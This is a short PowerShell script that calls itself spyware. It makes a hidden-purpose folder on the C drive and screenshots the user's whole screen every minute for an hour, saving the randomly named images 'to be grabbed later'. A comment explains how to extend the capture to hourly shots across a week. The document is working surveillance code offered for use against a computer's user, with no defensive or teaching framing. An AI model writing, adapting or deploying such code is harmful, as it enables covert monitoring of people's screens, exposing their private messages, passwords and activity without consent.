#This short script acts as spyware as it can take screenshots of a users computer and store them to a folder to be grabbed later.

#Change to windows C directory
cd C:\

#Making directory to store Screenshots in
mkdir Screens

#While loop that takes a Screenshot once every minute for one hour
#If you set ($hours -lt 168) and Start-Sleep to 3600 can get screenshot for every hour in a week
$hours = 0

while ($hours -lt 60){
#Randomizes the screenshot names
$name = get-random

#Using windows forms and relfection assembly we can take screenshot
[void][reflection.assembly]::loadwithpartialname("system.windows.forms")
$DemoScreenshot = [System.Windows.Forms.SystemInformation]::VirtualScreen
$WIDTH = $DemoScreenshot.Width
$HEIGHT = $DemoScreenshot.Height
$LEFTDIM = $DemoScreenshot.Left
$TOPDIM = $DemoScreenshot.Top

$BitmapScreenshot = New-Object System.Drawing.Bitmap $WIDTH, $HEIGHT
$FinalScreenshot = [System.Drawing.Graphics]::FromImage($BitmapScreenshot)
$FinalScreenshot.CopyFromScreen($LEFTDIM, $TOPDIM, 0, 0, $BitmapScreenshot.Size)

#Saving screenshot to screens folder
$FinalFile = "C:\Screens\$name.bmp"
$BitmapScreenshot.Save($FinalFile)

Start-Sleep 60
$hours++
}
